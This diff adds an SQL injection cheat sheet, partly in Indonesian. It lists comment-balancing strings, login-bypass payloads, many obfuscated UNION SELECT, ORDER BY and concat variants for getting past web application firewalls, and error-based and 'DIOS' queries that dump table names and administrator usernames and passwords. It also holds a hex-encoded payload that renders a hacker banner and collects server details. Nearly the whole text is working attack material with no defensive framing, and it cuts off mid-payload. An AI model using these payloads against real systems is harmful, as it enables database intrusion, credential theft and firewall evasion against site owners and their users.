@@ -1,0 +1,1961 @@
+Balancing Code
+integer based ::
+ 
+--
+-- -
+--+-
+)--
+)-- -
+)--+-
+))--
+))-- -
+))--+-
+;%00
+) ;%00
+));%00
+%23
+%60
+%90
+and 1=1
+and '1'='1
+and (1)=(1
+php?id=(1) -- -
+ 
+string based ::
+ 
+'--+-
+')-- -
+')--+-
+'))-- -
+'))--+-
+';%00
+');%00
+'));%00
+'%23
+'%60
+'%90
+' and 1=1
+' and '1'='1
+' and (1)=(1
+php?id=(1') -- -
+ 
+string based double quotes ::
+ 
+"-- -
+"--+-
+"%23
+")-- -
+")--+-
+"))--+-
+";%00
+") ;%00
+"));%00
+"%60
+"%90
+" and 1=1
+" and '1'='1
+" and (1)=(1
+php?id=(1") -- -
+
+_______________
+
+SQL injection strings to bypass login
+ 
+‘ or 1=1 –
+1'or’1'=’1
+admin’–
+” or 0=0 –
+or 0=0 –
+‘ or 0=0 #
+” or 0=0 #
+or 0=0 #
+‘ or ‘x’='x
+” or “x”=”x
+‘) or (‘x’='x
+‘ or 1=1–
+” or 1=1–
+or 1=1–
+‘ or a=a–
+” or “a”=”a
+‘) or (‘a’='a
+“) or (“a”=”a
+hi” or “a”=”a
+hi” or 1=1 –
+hi’ or 1=1 –
+hi’ or ‘a’='a
+hi’) or (‘a’='a
+hi”) or (“a”=”)
+admin'--
+= 'or' 1=1
+' or 1=1--
+'" or 1=1--
+' union select 1, 'Eyeless', 'ez2do', 1--
+admin'--
+administrator'--
+superuser'--
+test'--
+' or 0=0 --
+' or 0=0 --'
+' or 0=0 #
+" or 0=0 --
+" or 0=0 --'
+'" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+" or 1=1--
+or 1=1--
+' or a=a--'
+' or a=a #
+' or a=a--
+' or "a"="a
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") Or ("a"="a
+' Or 1=1--
+" or 1=1--
+or 1=1--
+' or 'a'='a
+" Or "a"="a
+') or ('a'='a
+[~] Chek Eror [~]
+ 
+01. '
+02. "
+03. or 1=1
+04. and 1=1
+05. and false
+06. and true
+• [Single qiotes]
+01. ' or '1'='1
+02. ' and '1'='1
+03. ' and false
+04. ' and true
+• [Double quotes]
+01. " or "1"="1
+02. " and "1"="1
+03. " and false
+04. " and true
+ 
+[~]Baypass True Condition[~]
+ 
+or '1
+|| '1
+null' || 'a'=_binary'a
+1' || 'a'=x'61
+1' && '0'=x'30
+1' %26%26 %270%27%3dx'30
+2' && 0.e1=_binary"0
+1 or 1.e1=0b1010
+' || 1 like 1
+'-'
+"-"
+' || 2 not like 1
+110 or x'30'=48
+'1'!=20
+1 or 20!='1'
+2 and 2>0
+3 || 0<1
+12 || 0b1010<0b1011
+0b11 || 0b1010x'30'
+1 or 0b1
+2121/**/||21
+111' or _binary'1
+1 or 2121
+1' or 12 rlike '1
+ 
+ 
+[~] KOMENTAR [~]
+ 
+01. --        : MySQL Linux Style
+02. --+     :   MySQL Windows Style
+03. #         : Hash (URL encode while use)
+04. --+-       :    SQL Comment
+05. ;%00     :  Null Byte
+07. `       :   Backtick
+08. -- -
+09. /*
+10. /**/
+11. %23
+12. //
+ 
+ 
+[~] order by [~]
+ 
+01. group by -- +
+02. and extractvalue(0x3a,concat(0x3a,(select count(*) from information_schema.columns where table_name='TABLE_NAME_HERE' and table_schema=database())))--+
+03. Procedure Analyse()--+
+04. and (select * from news)=(select 0)--+
+05. /**/ORDER/**/BY/**/
+06. /*!order*/+/*!by*/
+07. /*!ORDER BY*/
+08. /*!50000ORDER BY*/
+09. /*!50000ORDER*//**//*!50000BY*/
+10. /*!12345ORDER*/+/*!BY*/
+ 
+ 
+[~] UNION select [~]
+ 
+01. (uNioN)+(sElECt)….
+02. (uNioN+SeleCT)+…
+03. (UnI)(oN)+(SeL)(ecT)+….
+04. union (select 1,2,3,4…)
+05. /*!50000%55nIoN*/ /*!50000%53eLeCt*/
+06. %55nion(%53elect 1,2,3)-- -
+07. +union+distinct+select+
+08. +union+distinctROW+select+
+09. /**//*!12345UNION SELECT*//**/
+10. /**//*!50000UNION SELECT*//**/
+11. /**/UNION/**//*!50000SELECT*//**/
+12. /*!50000UniON SeLeCt*/
+13. union /*!50000%53elect*/
+14. +#uNiOn+#sEleCt
+15. +#1q%0AuNiOn all#qa%0A#%0AsEleCt
+16. /*!%55NiOn*/ /*!%53eLEct*/
+17. /*!u%6eion*/ /*!se%6cect*/
+18. +un/**/ion+se/**/lect
+19. uni%0bon+se%0blect
+20. %2f**%2funion%2f**%2fselect
+21. union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+22. REVERSE(noinu)+REVERSE(tceles)
+24. /*--*/union/*--*/select/*--*/
+25. union (/*!/**/ SeleCT */ 1,2,3)
+26. /*!union*/+/*!select*/
+27. union+/*!select*/
+28. /**/union/**/select/**/
+29. /**/uNIon/**/sEleCt/**/
+30. +%2F**/+Union/*!select*/
+31. /**//*!union*//**//*!select*//**/
+32. /*!uNIOn*/ /*!SelECt*/
+33. +union+distinct+select+
+34. +union+distinctROW+select+
+35. uNiOn aLl sElEcT
+36. UNIunionON+SELselectECT
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+%55nion/**/%53elect
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*--*//*!all*//*--*//*!select*/
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
+union+sel%0bect
++uni*on+sel*ect+
++#1q%0Aunion all#qa%0A#%0Aselect
+union(select (1),(2),(3),(4),(5))
+UNION(SELECT(column)FROM(table))
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+union(select(1),2,3)
+union (select 1111,2222,3333)
+uNioN (/*!/**/ SeleCT */ 11)
+union (select 1111,2222,3333)
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
++%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+/union\sselect/g
+/union\s+select/i
+/*!UnIoN*/SeLeCT
++UnIoN/*&a=*/SeLeCT/*&a=*/
++uni>on+sel>ect+
++(UnIoN)+(SelECT)+
++(UnI)(oN)+(SeL)(EcT)
++’UnI”On’+'SeL”ECT’
++uni on+sel ect+
++/*!UnIoN*/+/*!SeLeCt*/+
+/*!u%6eion*/ /*!se%6cect*/
+uni%20union%20/*!select*/%20
+union%23aa%0Aselect
+/**/union/*!50000select*/
+/^.*union.*$/ /^.*select.*$/
+/*union*/union/*select*/select+
+/*uni X on*/union/*sel X ect*/
++un/**/ion+sel/**/ect+
++UnIOn%0d%0aSeleCt%0d%0a
+UNION/*&test=1*/SELECT/*&pwn=2*/
+un?<ion sel="">+un/**/ion+se/**/lect+
++UNunionION+SEselectLECT+
+ 
++uni%0bon+se%0blect+
+%252f%252a*/union%252f%252a /select%252f%252a*/
+/%2A%2A/union/%2A%2A/select/%2A%2A/
+%2f**%2funion%2f**%2fselect%2f**%2f
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+/*!UnIoN*/SeLecT+
+ 
+[~] information_schema.tables [~]
+ 
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+ 
+[~] concat() [~]
+ 
+CoNcAt()
+concat()
+CON%08CAT()
+CoNcAt()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+ 
+[~] group_concat() [~]
+ 
+/*!group_concat*/()
+gRoUp_cOnCAt()
+group_concat(/*!*/)
+group_concat(/*!12345table_name*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!12345GroUP_ConCat*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(group_concat(table_name)))
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(table_name)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!table_name*/)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
+convert(group_concat(/*!50000table_name*/)+using+ascii)
+CONVERT(group_concat(table_name)+USING+latin1)
+CONVERT(group_concat(table_name)+USING+latin2)
+CONVERT(group_concat(table_name)+USING+latin3)
+CONVERT(group_concat(table_name)+USING+latin4)
+CONVERT(group_concat(table_name)+USING+latin5)
+ 
+[~] Eror based [~]
+ 
+• Chek versi
+= and (select * from (select name_const(version(),1),name_const(version(),1))a)
+• Chek user
+= and (select 1 from (select count(*),concat((select(select concat(cast(user() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+• Chek database
+= and (select 1 from (select count(*),concat((select(select concat(cast(user() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+• Chek Table
+= and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+• Chek Column
+= and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e6973747261746f7273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+= and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e6973747261746f7273 limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+= and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e6973747261746f7273 limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ 
+• Dump data
+= and (select 1 from (select count(*),concat((select(select concat(cast(concat(user_name,0x3a,user_password) as char),0x7e)) from administrators limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+= and (select 1 from (select count(*),concat((select(select concat(cast(concat(user_name,0x3a,user_password) as char),0x7e)) from administrators limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ 
+ 
+[~] Using Xpath [~]
+01. and extractvalue(0x0a,concat(0x0a,(OUR QUERY HERE)))--
+ 
+[~]DIOS[~]
+ 
+01. (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+02. (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))
+03. (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+04. make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+05. (Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns) where@:=export_set(5,export_set(5,export_set(5,@,table_schema,0x3c6c693e,2),table_name,0xa3a,2),column_name,0xa3a,2)),@,2))
+
+
+[~] order by [~]
+
+/**/ORDER/**/BY/**/
+/*!order*/+/*!by*/
+/*!ORDER BY*/
+/*!50000ORDER BY*/
+/*!50000ORDER*//**//*!50000BY*/
+/*!12345ORDER*/+/*!BY*/
+
+[~] UNION select [~]
+
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
++%2F**/+Union/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
+uNiOn aLl sElEcT
+UNIunionON+SELselectECT
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+%55nion/**/%53elect
+uni/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*--*//*!all*//*--*//*!select*/
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
+union+sel%0bect
++uni*on+sel*ect+
++#1q%0Aunion all#qa%0A#%0Aselect
+union(select (1),(2),(3),(4),(5))
+UNION(SELECT(column)FROM(table))
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+union(select(1),2,3)
+union (select 1111,2222,3333)
+uNioN (/*!/**/ SeleCT */ 11)
+union (select 1111,2222,3333)
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
++%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+/union\sselect/g
+/union\s+select/i
+/*!UnIoN*/SeLeCT
++UnIoN/*&a=*/SeLeCT/*&a=*/
++uni>on+sel>ect+
++(UnIoN)+(SelECT)+
++(UnI)(oN)+(SeL)(EcT)
++’UnI”On’+'SeL”ECT’
++uni on+sel ect+
++/*!UnIoN*/+/*!SeLeCt*/+
+/*!u%6eion*/ /*!se%6cect*/
+uni%20union%20/*!select*/%20
+union%23aa%0Aselect
+/**/union/*!50000select*/
+/^.*union.*$/ /^.*select.*$/
+/*union*/union/*select*/select+
+/*uni X on*/union/*sel X ect*/
++un/**/ion+sel/**/ect+
++UnIOn%0d%0aSeleCt%0d%0a
+UNION/*&test=1*/SELECT/*&pwn=2*/
+un?+un/**/ion+se/**/lect+
++UNunionION+SEselectLECT+
++uni%0bon+se%0blect+
+%252f%252a*/union%252f%252a /select%252f%252a*/
+/%2A%2A/union/%2A%2A/select/%2A%2A/
+%2f**%2funion%2f**%2fselect%2f**%2f
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+/*!UnIoN*/SeLecT+
+
+
+
+
+[~] information_schema.tables [~]
+
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ 
+
+[~] concat() [~]
+
+CoNcAt()
+concat()
+CON%08CAT()
+CoNcAt()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+
+[~] group_concat() [~]
+
+/*!group_concat*/()
+gRoUp_cOnCAt()
+group_concat(/*!*/)
+group_concat(/*!12345table_name*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!12345GroUP_ConCat*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(group_concat(table_name)))
+
+- local variable
++And mod(52,12) and@dh:=concat('heker')+/*!50000ALL/**Heker**/*/+/*!50000SELECT/**Heker**/*/
+
+dump table_name
+(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(column_name)WHERE(@x)IN(@x:=CONCAT(0x20,@x,table_name,0x3c62723e))))x)
+
+waf bypass 403 dan seterusnya 
+(select(@x)/*!50000from/**Heker**/*/(/*!50000select/**Heker**/*/(@x:=0x00),(select(0)/*!From/**Heker**/*/(/*!50000information_schema.columns/**Heker**/*/)/*!50000where/**Heker**/*/(table_schema=database/*Heker*//**Heker*/())and(0x00)in(@x:=/*!50000coNcat/**Heker**/*/(@x,0x3c6c693e,/*!50000table_name/**Heker**/*/,0x3a3a,/*!50000column_name/**Heker**/*/))))x)
+
+waf bypass 500 bisa juga blm tentu tembus semua 500
+(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e203c3d3d3e20,TaBLe_nAMe,0x3a3a,column_name))))a)
+heker.com/heker.php?id=1' and 0 union select 1,2,group_concat(0x3c62723e,table_name,0x3a3a,column_name)),4,5,6 from information_schema.columns where table_schema=database()-- -
+
+bypas order by 
+%23%0AORDER%23%0ABY%23%0A
+%0AORDER%0ABY%0A
++ORDER+BY+1+ASC
++ORDER+BY+1+DECS
++/*!50000ORDER*/+/*!50000BY*/+1
++/*!50000GROUP*/+/*!50000BY*/+1
++ORDER BY/**_**/1
+
+bypass union select
+%23%0AuNION%23%0ASeLECT%23%0A
++AND+MOD(52,12)+/*!50000UNION/**_**/*/+/*!50000SELECT/**_**/*/
++UNION+ALL+SELECT
+union (select 1111,2222,3333)
++AND+0+UNION+DISTINCT+SELECT
++AND+0+UNION/**/DISTINCTROW+SELECT
++And/**/.0union/*%26*/distinctROW+select
++And .0union/**/distinctrow select/**/distinctrow
++And .0UnIOn-- -%0ASeLe%43t
++And .0union/**/distinctrow%23GearFourth%0aselect/**/distinctrow
+
+bypass union select ip block
++And .0union/**/distinctrow%23GearFourthBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB%0aselect/**/distinctrow
+%23%0AAND%23%0A0%23%0AUNION%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ASelect%23%0A
+
+bypass menggunakan whitespace
+%0aAND%0a0%0aUNION%0aSELECT%0a
+
+bypass concat
+CoNcAt()
+concat%23%0a()
+concat/**_**/()
+CON%08CAT()
+CoNcAt()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(heker)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+
+bypass information_schema.tables
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+
+Dios Rh
+
+/*!00000CoNcAt*/(0x3c666f6e7420636f6c6f723d7465616c3e3c7363726970743e646f63756d656e742e7469746c653d2248656c6c6f5765656e223b3c2f7363726970743e3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f6d617863646e2e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e332e312f6373732f626f6f7473747261702e6d696e2e637373223e3c63656e7465723e3c696d67207372633d2268747470733a2f2f692e6962622e636f2f397136503446312f32303230303730342d3136353732302e6a70672220636c6173733d226d782d6175746f20642d626c6f636b20696d672d666c75696422207469746c653d226f6d6573742220616c743d226f6d65737422207374796c653d2277696474683a2037303070783b206865696768743a20373030707822202f3e3c2f63656e7465723e3c683220636c6173733d22746578742d63656e74657220746578742d64616e676572223e3c623e3c666f6e7420636f6c6f723d6372696d736f6e3e52454249525448204841584f523c2f623e3c2f68323e3c63656e7465723e3c736d616c6c3e3c623e3c666f6e7420636f6c6f723d6d6167656e74613e54414e4747414c,/*!00000NOW()*/,0x3c2f623e3c2f736d616c6c3e3c2f63656e7465723e3c62723e3c64697620636c6173733d227461626c652d726573706f6e73697665223e3c7461626c6520636c6173733d227461626c65207461626c652d73747269706564207461626c652d626f726465726564207461626c652d686f766572223e3c74723e3c746820636f6c7370616e3d22322220636c6173733d22746578742d63656e7465722062672d6461726b20746578742d61717561223e3c666f6e7420636f6c6f723d6c696d653e494e464f524d415349205445524b494e493c2f74683e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d707572706c653e5455414e2052554d41483c2f74643e3c74643e,/*!00000@@hostname*/,0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d626c75653e4241534953444154413c2f74643e3c74643e,/*!00000database*/(),0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d677265656e3e50454e4747554e413c2f74643e3c74643e,/*!00000current_user*/(),0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d6465657070696e6b3e53495354454d204f5045524153493c2f74643e3c74643e,/*!00000@@version_compile_os*/,0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d6f72616e67653e56455253493c2f74643e3c74643e,/*!00000version*/(),0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d7465616c3e50454c41425548414e3c2f74643e3c74643e,/*!00000@@port*/,0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d63686f636f6c6174653e444952454b544f524920444154413c2f74643e3c74643e,/*!00000@@datadir*/,0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d66697265627269636b3e54415554414e2053494d3c2f74643e3c74643e,/*!00000@@GLOBAL.have_symlink*/,0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d626c61636b3e53534c3c2f74643e3c74643e,/*!00000@@GLOBAL.have_ssl*/,0x3c2f74643e3c2f74723e3c74723e3c74643e3c666f6e7420636f6c6f723d7265643e48414b20495354494d4557413c2f74643e3c74643e,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f74643e3c2f74723e3c2f7461626c653e3c62723e3c7461626c6520636c6173733d227461626c65207461626c652d73747269706564207461626c652d626f726465726564207461626c652d686f766572223e3c74723e3c746820636f6c7370616e3d22322220636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e3c666f6e7420636f6c6f723d6c696d653e4d454d4255414e4720424154413c2f74683e3c2f74723e3c74723e3c746820636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e3c666f6e7420636f6c6f723d6c696d653e4e414d4120544142454c3c2f74683e3c746820636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e3c666f6e7420636f6c6f723d6c696d653e4e414d4120424944414e473c2f74683e3c2f74723e3c74723e,(select(@x)from(select(@x:=0x00),(select(0)/*!From*/(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat%20(@x